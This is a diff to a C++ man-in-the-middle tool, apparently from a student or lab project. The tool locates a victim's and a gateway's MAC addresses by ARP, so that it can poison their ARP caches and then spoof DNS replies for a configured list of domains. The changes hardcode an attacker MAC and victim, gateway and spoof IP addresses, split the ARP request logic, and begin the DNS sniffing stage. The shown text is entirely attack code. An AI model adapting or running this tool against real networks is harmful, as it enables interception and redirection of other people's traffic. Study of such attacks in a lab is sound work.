@@ -19,7 +19,7 @@ int main(int argc, const char *argv[]) {
     const char *interfaceName = "eno1";                           // get this from config file
     std::unordered_map<std::string, std::string> domainsToPoison; // get this from config file
 
-    unsigned char attackerMac[ETH_ALEN]; // get this from config file
+    unsigned char attackerMac[ETH_ALEN] = {0xe4, 0xb9, 0x7a, 0xee, 0x8d, 0xa5}; // get this from config file
     unsigned char victimMac[ETH_ALEN];   // get this from arp request
     unsigned char gatewayMac[ETH_ALEN];  // get this from arp request
     struct in_addr victimIp;             // get this from config file
@@ -27,11 +27,15 @@ int main(int argc, const char *argv[]) {
 
     struct arp_header victimArp;
     struct arp_header gatewayArp;
-    struct arp_header arpRequest;
+    struct arp_header arpRequestVictim;
+    struct arp_header arpRequestGateway;
 
     // tmp fake spoofing address
     struct in_addr spoofIp;
-    spoofIp.s_addr = 0xdeadbeef;
+    spoofIp.s_addr = 0x1300a8c0;
+
+    victimIp.s_addr = 0x1400a8c0;
+    gatewayIp.s_addr = 0x6400a8c0;
 
     // prepare the mac variables
     memset(victimMac, 0, ETH_ALEN);
@@ -55,35 +59,36 @@ int main(int argc, const char *argv[]) {
                     }
                     victimMacSet = true;
                     std::cout << "victim mac acquired" << std::endl;
-                }
-
-                if (tmp->s_addr == gatewayIp.s_addr) {
+                } else if(tmp->s_addr == gatewayIp.s_addr) {
                     for (int i = 0; i < ETH_ALEN; i++) {
                         gatewayMac[i] = arp->arp_sha[i];
                     }
                     gatewayMacSet = true;
                     std::cout << "gateway mac acquired" << std::endl;
+                } else {
+                    std::cout << "received unwanted arp reply" << std::endl;
                 }
             }
         });
     std::cout << "starting arp sniff" << std::endl;
-    ipEngine.startSniff(NetworkEngine::ARP_FILTER);
+    ipEngine.startSniff("arp");
     std::cout << "arp sniff started" << std::endl;
+
+    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestVictim);
+    craftArpRequest(&gatewayIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestGateway);
 
     // stop sniffing for macs once they have been found
     while (true) {
         if (!victimMacSet) {
             // send arp request to get mac address of victim
             std::cout << "requesting victim mac" << std::endl;
-            craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequest);
-            ipEngine.sendArp(arpRequest);
+            ipEngine.sendArp(arpRequestVictim);
         }
 
         if (!gatewayMacSet) {
             // send arp request to get the mac address of gateway
             std::cout << "requesting gateway mac" << std::endl;
-            craftArpRequest(&gatewayIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequest);
-            ipEngine.sendArp(arpRequest);
+            ipEngine.sendArp(arpRequestGateway);
         }
 
         if (victimMacSet && gatewayMacSet) {
@@ -93,7 +98,7 @@ int main(int argc, const char *argv[]) {
             break;
         }
 
-        sleep(2);
+        sleep(5);
     }
 
     // start dns sniffing
